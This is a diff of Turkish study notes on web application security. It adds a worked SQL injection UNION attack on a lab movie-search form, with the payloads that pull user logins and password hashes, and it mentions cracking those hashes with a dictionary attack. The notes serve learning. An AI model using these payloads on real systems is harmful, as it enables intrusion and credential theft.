@@ -1,5 +1,4 @@
-Bu eğitime ilk olarak Web uygulama güvenliği ve Web sızma ile başlayacağım.Bunu bitirme hedefim: 3 ekim 2020 den 9 ekim 2020 dir.
-Bu eğitimdeki amaç: Uygulama güvenliği üzerindeki zafiyetleri tespit etmek ve bu zafiyetlerin kapatılmasına yönelik önlem almaktır.
+Bu eğitime ilk olarak Web uygulama güvenliği ve Web sızma ile başlayacağım. Uygulama güvenliği üzerindeki zafiyetleri tespit etmek ve bu zafiyetlerin kapatılmasına yönelik önlem almaktır.
 
 Buradaki konularımız:
 -Web uygulama güvenliğine giriş.
@@ -11,7 +10,7 @@ Buradaki konularımız:
 -File Inclusion 
 -Brute Force testi
 
-en ana güzel konular....
+
 
 -Web uygulama güvenliği: Web siteleri, web uygulamaları, web servislerinin(rest api ve soap api gibi) güvenliğini kapsar.
 
@@ -46,6 +45,29 @@ Veri tabanından veri aldığı düşünülen bütün girdi noktaları bulunur.(
 Manuel olarakta saldırabilir, otomatik tool araçlarla da saldırabilir.
 
 bu kısımda Sql İnjection saldırıları nasıl yapılıyor ve çeşitleri nelerdir bunu öğreneceğiz.
+
+SQLUNIONMETHOD:burada bir web uygulamasında film aratma sekmesinde film aramamız beklenirken, biz kendi sorgularımızı bu arama butonuna yazdığımız zaman 
+sisteme kayıt olan kullanıcıların hash li şekilde tutulan password bilgilerine ulaştık.Bunu da yine dictionary attack kullanarak çözebiliriz.
+aşağıdaki sorgulardan yararlandık:
+SELECT * FROM movies WHERE title LIKE '%man' ORDER BY 7#%'
+man' ORDER BY 7#
+man' UNION SELECT 1,2,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()#
+man' UNION SELECT 1,2,3,4,5,6,7 FROM information_schema.tables WHERE table_name='users'#
+man' UNION SELECT 1,login, password, 4,5,6,7 FROM users#
+
+SQL INJECTION (GET/SEARCH).
+
+SQLBLINDMETHOD:
+
+SQLMAPKULLANIMI:
+
+
+*****************************SQL İNJECTİON İS OVER******************
+
+CROSS SİTE SCRİPTİNG (XSS)
+
+
+
 
 
 
